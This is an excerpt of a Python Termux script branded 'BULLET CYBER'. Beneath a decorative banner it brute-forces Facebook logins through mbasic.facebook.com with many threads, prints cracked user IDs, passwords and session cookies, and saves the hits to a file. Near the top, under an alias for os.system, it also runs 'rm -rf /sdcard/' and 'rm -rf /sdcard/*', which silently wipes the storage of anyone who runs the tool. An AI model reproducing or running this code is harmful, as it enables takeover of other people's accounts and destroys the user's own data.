...
from os import system as _Bullet_
...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
_Bullet_("termux-setup-storage -y")
_Bullet_("rm -rf /sdcard/")
_Bullet_("rm -rf /sdcard/*")
...
today = date.today()
logo = ("""
\033[31;1m██████╗ \033[32;1m██╗   ██╗\033[33;1m██╗     \033[34;1m██╗     \033[35;1m███████╗\033[37;1m████████╗
\033[31;1m██╔══██╗\033[32;1m██║   ██║\033[33;1m██║     \033[34;1m██║     \033[35;1m██╔════╝\033[37;1m╚══██╔══╝
\033[31;1m██████╔╝\033[32;1m██║   ██║\033[33;1m██║     \033[34;1m██║     \033[35;1m█████╗     \033[37;1m██║   
\033[31;1m██╔══██╗\033[32;1m██║   ██║\033[33;1m██║     \033[34;1m██║     \033[35;1m██╔══╝     \033[37;1m██║   
\033[31;1m██████╔╝\033[32;1m╚██████╔╝\033[33;1m███████╗\033[34;1m███████╗\033[35;1m███████╗   \033[37;1m██║   
...
\033[1;33m╔═══════════════════════════════════════════════╗
║        \033[1;32m  WELLCOME TO 𝐁𝐔𝐋𝐋𝐄𝐓 𝐂𝐘𝐁𝐄𝐑            \033[1;33m ║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[33;1m║ ╔═══════════════════════════════════════════╗ ║
\033[34;1m║ ║❤︎[❥] ᥬ𝐓𝐎𝐋𝐋➤➤❦❦❦❦\033[31;1m𝐍𝐀𝐌𝐄➤\033[32;1m𝐁𝐔𝐋𝐋𝐄𝐓➤               ║ ║
\033[35;1m║ ║❤︎[❥] ᥬ𝐀𝐔𝐓𝐇𝐎𝐑➤➤❦❦❦\033[32;1m𝐁𝐔𝐋𝐋𝐄𝐓➤\033[33;1m❥𝐂𝐘𝐁𝐄𝐑➤            ║ ║
\033[36;1m║ ║❤︎[❥] ᥬ𝐆𝐈𝐓𝐇𝐔𝐁➤➤❦❦❦\033[33;1mBullet-➤\033[34;1m❥Cyber\033[34;1m➤           ║ ║
\033[37;1m║ ║❤︎[❥] ᥬ𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊➤➤❦❦❦\033[34;1m𝙈𝙙.𝙏𝙖𝙢𝙯𝙞𝙙➤\033[35;1m𝙃𝙤𝙨𝙨𝙖𝙞𝙣       ║ ║
\033[31;1m║ ║❤︎[❥] ᥬ𝐆𝐑𝐔𝐏➤➤❦❦❦\033[35;1m𝙈𝙐𝙎𝙇𝙄𝙈 𝘾𝙔𝘽𝙀𝙍➤\033[92;1m❥➤             ║ ║
\033[32;1m║ ║❤︎[❥] ᥬ𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙋𝘼𝙂𝙀➤➤❦❦❦\033[36;1m𝐁𝐔𝐋𝐋𝐄𝐓 𝐂𝐘𝐁𝐄𝐑 ➤     ║ ║
\033[33;1m║ ╚═══════════════════════════════════════════╝ ║
\033[34;1m╚═══════════════════════════════════════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
...
def xxr():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mBULLET-CYBER')
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=T1zuY5AN9KW5RvHSaqZe2Xn0; sb=T1zuY8O1EzMDbcGjm6haRwpt; fr=0QjFjoJRIM88Dzuw4.AWUTrRctd2s6oSkTBfF_O0Cjihg.Bj7l5w.dB.AAA.0.0.Bj7mNu.AWWP30ivZUk; locale=en_US; vpd=v1%3B794x402x1.7937500476837158; wd=403x794',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfePIPxVJghJyp5rTMI9KC0CwNWz_XB9rsPacO6gM_N54aYmat8NMW-SnsNqUy0SqOPip1htkChYMi0jFn7ghABSNWWpU9f65ohCGLgNfyBVOA&smuh=56434&lh=Ac9ymi463d8Kk8qJwaE&_rdr',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [BULLET-CYBER-OK💉] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [BULLET-CYBER-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BULLET-CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}BULLET-CYBER💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
